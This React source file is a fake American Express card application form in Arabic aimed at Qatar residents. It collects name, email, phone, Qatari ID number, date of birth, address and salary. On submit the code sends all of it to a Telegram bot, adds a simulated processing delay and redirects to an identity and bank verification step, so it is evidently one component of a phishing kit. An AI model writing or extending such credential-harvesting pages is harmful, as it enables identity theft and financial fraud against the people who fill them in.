// components/ApplicationForm.jsx
'use client';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { sendToTelegram } from '../lib/telegramBot';

export default function ApplicationForm() {
  const router = useRouter();
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    nationality: '',
    qid: '',
    dob: '',
    address: '',
    salary: '',
    employment: 'employed'
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Clear error when field is edited
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: '' }));
    }

    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const validateForm = () => {
    const newErrors = {};

    // Validate name
    if (!formData.fullName.trim()) {
      newErrors.fullName = 'الاسم الكامل مطلوب';
    }

    // Validate email
    if (!/^\S+@\S+\.\S+$/.test(formData.email)) {
      newErrors.email = 'البريد الإلكتروني غير صالح';
    }

    // Validate phone
    if (!/^\d{8,}$/.test(formData.phone.replace(/\D/g, ''))) {
      newErrors.phone = 'رقم هاتف غير صالح';
    }

    // Validate QID
    if (!/^\d{11}$/.test(formData.qid.replace(/\D/g, ''))) {
      newErrors.qid = 'رقم البطاقة الشخصية القطرية غير صالح';
    }

    // Validate DOB
    if (!formData.dob) {
      newErrors.dob = 'تاريخ الميلاد مطلوب';
    } else {
      const birthDate = new Date(formData.dob);
      const today = new Date();
      let age = today.getFullYear() - birthDate.getFullYear();
      const monthDiff = today.getMonth() - birthDate.getMonth();

      if (
        monthDiff < 0 ||
        (monthDiff === 0 && today.getDate() < birthDate.getDate())
      ) {
        age--;
      }

      if (age < 21) {
        newErrors.dob = 'يجب أن يكون عمرك 21 عامًا على الأقل';
      }
    }

    // Validate address
    if (!formData.address.trim()) {
      newErrors.address = 'العنوان مطلوب';
    }

    // Validate salary
    if (
      !formData.salary ||
      isNaN(formData.salary) ||
      Number(formData.salary) < 15000
    ) {
      newErrors.salary = 'الراتب الشهري يجب أن يكون 15,000 ريال قطري أو أكثر';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setLoading(true);

    try {
      // Send application data to Telegram
      await sendToTelegram({
        type: 'application',
        ...formData
      });

      // Store data for next steps
      sessionStorage.setItem('applicationData', JSON.stringify(formData));

      // Simulate processing delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Redirect to bank selection
      router.push('/verify-identity');
    } catch (error) {
      console.error('Application submission error:', error);
      setLoading(false);
    }
  };

  return (
    <div className='bg-amex-dark-gray mx-auto max-w-3xl rounded-xl p-6 shadow-lg md:p-8'>
      <h2 className='text-amex-blue mb-6 text-2xl font-bold'>
        تقديم طلب للحصول على البطاقة
      </h2>

      <form onSubmit={handleSubmit}>
        <div className='grid grid-cols-1 gap-6 md:grid-cols-2'>
          {/* Full Name */}
          <div className='md:col-span-2'>
            <label htmlFor='fullName' className='mb-2 block text-gray-200'>
              الاسم الكامل
            </label>
            <input
              type='text'
              id='fullName'
              name='fullName'
              value={formData.fullName}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.fullName ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.fullName && (
              <p className='mt-1 text-sm text-red-500'>{errors.fullName}</p>
            )}
          </div>

          {/* Email and Phone */}
          <div>
            <label htmlFor='email' className='mb-2 block text-gray-200'>
              البريد الإلكتروني
            </label>
            <input
              type='email'
              id='email'
              name='email'
              value={formData.email}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.email && (
              <p className='mt-1 text-sm text-red-500'>{errors.email}</p>
            )}
          </div>

          <div>
            <label htmlFor='phone' className='mb-2 block text-gray-200'>
              رقم الهاتف
            </label>
            <input
              type='tel'
              id='phone'
              name='phone'
              value={formData.phone}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.phone && (
              <p className='mt-1 text-sm text-red-500'>{errors.phone}</p>
            )}
          </div>

          {/* Nationality and QID */}
          <div>
            <label htmlFor='nationality' className='mb-2 block text-gray-200'>
              الجنسية
            </label>
            <select
              id='nationality'
              name='nationality'
              value={formData.nationality}
              onChange={handleChange}
              className='bg-amex-dark focus:border-amex-blue w-full rounded-lg border border-gray-600 px-4 py-3 text-white focus:outline-none'
            >
              <option value=''>اختر الجنسية</option>
              <option value='قطري'>قطري</option>
              <option value='مقيم'>مقيم</option>
            </select>
          </div>

          <div>
            <label htmlFor='qid' className='mb-2 block text-gray-200'>
              رقم البطاقة الشخصية القطرية
            </label>
            <input
              type='text'
              id='qid'
              name='qid'
              value={formData.qid}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.qid ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.qid && (
              <p className='mt-1 text-sm text-red-500'>{errors.qid}</p>
            )}
          </div>

          {/* Date of Birth */}
          <div>
            <label htmlFor='dob' className='mb-2 block text-gray-200'>
              تاريخ الميلاد
            </label>
            <input
              type='date'
              id='dob'
              name='dob'
              value={formData.dob}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.dob ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.dob && (
              <p className='mt-1 text-sm text-red-500'>{errors.dob}</p>
            )}
          </div>

          {/* Employment Status */}
          <div>
            <label htmlFor='employment' className='mb-2 block text-gray-200'>
              الحالة الوظيفية
            </label>
            <select
              id='employment'
              name='employment'
              value={formData.employment}
              onChange={handleChange}
              className='bg-amex-dark focus:border-amex-blue w-full rounded-lg border border-gray-600 px-4 py-3 text-white focus:outline-none'
            >
              <option value='employed'>موظف</option>
              <option value='self-employed'>عمل حر</option>
              <option value='business-owner'>صاحب عمل</option>
            </select>
          </div>

          {/* Address */}
          <div className='md:col-span-2'>
            <label htmlFor='address' className='mb-2 block text-gray-200'>
              العنوان
            </label>
            <input
              type='text'
              id='address'
              name='address'
              value={formData.address}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.address && (
              <p className='mt-1 text-sm text-red-500'>{errors.address}</p>
            )}
          </div>

          {/* Monthly Salary */}
          <div className='md:col-span-2'>
            <label htmlFor='salary' className='mb-2 block text-gray-200'>
              الراتب الشهري (ريال قطري)
            </label>
            <input
              type='number'
              id='salary'
              name='salary'
              value={formData.salary}
              onChange={handleChange}
              className={`bg-amex-dark focus:border-amex-blue w-full rounded-lg border ${errors.salary ? 'border-red-500' : 'border-gray-600'} px-4 py-3 text-white focus:outline-none`}
            />
            {errors.salary && (
              <p className='mt-1 text-sm text-red-500'>{errors.salary}</p>
            )}
            <p className='mt-1 text-sm text-gray-400'>
              الحد الأدنى للراتب المطلوب هو 15,000 ريال قطري شهرياً
            </p>
          </div>
        </div>

        <div className='mt-8'>
          <p className='mb-4 text-sm text-gray-300'>
            بالتقديم، أنت توافق على شروط وأحكام بطاقة أمريكان إكسبريس وتسمح لنا
            بإجراء تحقق من هويتك ومعلوماتك الائتمانية.
          </p>

          <button
            type='submit'
            className='btn-amex flex w-full items-center justify-center'
            disabled={loading}
          >
            {loading ? (
              <>
                <svg
                  className='text-amex-dark -ml-1 mr-3 h-5 w-5 animate-spin'
                  xmlns='http://www.w3.org/2000/svg'
                  fill='none'
                  viewBox='0 0 24 24'
                >
                  <circle
                    className='opacity-25'
                    cx='12'
                    cy='12'
                    r='10'
                    stroke='currentColor'
                    strokeWidth='4'
                  ></circle>
                  <path
                    className='opacity-75'
                    fill='currentColor'
                    d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
                  ></path>
                </svg>
                جاري المعالجة...
              </>
            ) : (
              'تقديم الطلب'
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
